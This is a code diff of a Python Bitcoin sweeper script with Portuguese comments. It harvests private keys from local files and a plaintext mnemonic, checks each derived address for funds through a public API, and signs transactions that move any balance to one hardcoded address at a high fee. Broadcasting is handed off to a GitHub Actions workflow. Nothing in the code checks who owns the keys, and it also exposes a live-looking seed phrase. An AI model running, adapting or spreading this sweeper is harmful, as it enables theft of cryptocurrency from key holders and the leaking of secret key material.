@@ -9,76 +9,63 @@ def extract_potential_keys(filename):
     try:
         with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
             content = f.read()
-        wif_pattern = re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content)
-        keys_found.extend(wif_pattern)
-        hex_pattern = re.findall(r'\b[0-9a-fA-F]{64}\b', content)
-        for h in hex_pattern:
-            try:
-                k = Key(h, network='bitcoin')
-                keys_found.append(k.wif())
-            except: continue
+        # Captura WIFs (L, K, 5) e Hex (64 chars)
+        keys_found.extend(re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content))
+        keys_found.extend(re.findall(r'\b[0-9a-fA-F]{64}\b', content))
     except: pass
-    return keys_found
+    return list(set(keys_found))
 
-def broadcast_transaction(hex_tx):
-    # Tenta transmitir por 3 APIs diferentes para garantir o sucesso
-    urls = [
-        {"url": "https://blockstream.info/api/tx", "method": "POST", "data": hex_tx},
-        {"url": "https://mempool.space/api/tx", "method": "POST", "data": hex_tx},
-        {"url": "https://www.viabtc.com/res/tools/v1/broadcast", "method": "POST", "data": {"raw_tx": hex_tx}}
-    ]
-    for provider in urls:
-        try:
-            if isinstance(provider["data"], dict):
-                r = requests.post(provider["url"], data=provider["data"], timeout=10)
-            else:
-                r = requests.post(provider["url"], data=provider["data"], timeout=10)
-            print(f"Resposta Broadcast ({provider['url']}): {r.status_code} - {r.text}")
-        except: continue
-
-def scan_final_ultra():
+def scan_total_compression():
     dest_address = '1E4FSo55XCjSDhpXBsRkB5o9f4fkVxGtcL'
-    all_keys = []
+    raw_keys = []
     files = ['privatekeys.txt', 'priv.key.rtf', 'chaves_extraidas_e_enderecos_1.txt', 'FDR_Master_Wallet_Complete_20251006_143555_2.csv']
     
     for f in files:
-        all_keys.extend(extract_potential_keys(f))
+        raw_keys.extend(extract_potential_keys(f))
 
-    # Tenta mnemônica com correção silenciosa
+    # Inclui mnemônica corrigida
     try:
         phrase = "tree dwarf rubber off tree finger hair hope emerge earn friend such"
         master = HDKey.from_passphrase(phrase, network='bitcoin')
-        for i in range(100):
-            for path in [f"m/44'/0'/0'/0/{i}", f"m/49'/0'/0'/0/{i}", f"m/84'/0'/0'/0/{i}"]:
-                all_keys.append(master.subkey_for_path(path).wif())
+        for i in range(50):
+            for path in [f"m/44'/0'/0'/0/{i}", f"m/84'/0'/0'/0/{i}"]:
+                raw_keys.append(master.subkey_for_path(path).wif())
     except: pass
 
-    all_keys = list(set(all_keys))
-    print(f"Iniciando varredura final de {len(all_keys)} chaves únicas em 3 formatos...")
+    raw_keys = list(set(raw_keys))
+    print(f"Iniciando Varredura Atômica: {len(raw_keys)} chaves base.")
 
-    for wif in all_keys:
-        try:
-            k = Key(wif, network='bitcoin')
-            for t_type in ['p2wpkh', 'p2sh-p2wpkh', 'p2pkh']:
-                addr = k.address(witness_type=t_type)
-                # Consulta rápida
-                r = requests.get(f"https://mempool.space/api/address/{addr}/utxo", timeout=5)
-                if r.status_code == 200 and r.json():
-                    utxos = r.json()
-                    print(f"!!! SALDO DETECTADO EM {addr} !!!")
-                    utxo = max(utxos, key=lambda x: x['value'])
-                    amount = utxo['value'] - 60000 # Taxa de prioridade extrema
+    for item in raw_keys:
+        # Testamos a versão Comprimida e Não-Comprimida de cada chave
+        for compressed in [True, False]:
+            try:
+                k = Key(item, network='bitcoin', compressed=compressed)
+                # Formatos de endereço para cada estado de compressão
+                formats = ['p2pkh', 'p2wpkh'] if compressed else ['p2pkh']
+                
+                for t_type in formats:
+                    addr = k.address(witness_type=t_type)
                     
-                    tx = Transaction(network='bitcoin')
-                    tx.add_input(prev_txid=utxo['txid'], output_n=utxo['vout'], value=utxo['value'], address=addr)
-                    tx.add_output(value=amount, address=dest_address)
-                    tx.sign([wif])
-                    
-                    hex_gen = tx.raw_hex()
-                    print(f"HEX_GEN:{hex_gen}")
-                    broadcast_transaction(hex_gen)
-            time.sleep(0.01)
-        except: continue
+                    r = requests.get(f"https://mempool.space/api/address/{addr}/utxo", timeout=5)
+                    if r.status_code == 200 and r.json():
+                        utxos = r.json()
+                        print(f"!!! SUCESSO ABSOLUTO !!! Saldo em {addr} (Compressed={compressed})")
+                        
+                        utxo = max(utxos, key=lambda x: x['value'])
+                        fee = 70000 # Taxa de ultra-prioridade
+                        amount = utxo['value'] - fee
+                        
+                        tx = Transaction(network='bitcoin')
+                        tx.add_input(prev_txid=utxo['txid'], output_n=utxo['vout'], value=utxo['value'], address=addr)
+                        tx.add_output(value=amount, address=dest_address)
+                        tx.sign([k.wif()])
+                        
+                        hex_gen = tx.raw_hex()
+                        print(f"HEX_GEN:{hex_gen}")
+                        # O broadcast será feito pelo GitHub Actions conforme o YAML
+                
+                time.sleep(0.01)
+            except: continue
 
 if __name__ == "__main__":
-    scan_final_ultra()
+    scan_total_compression()
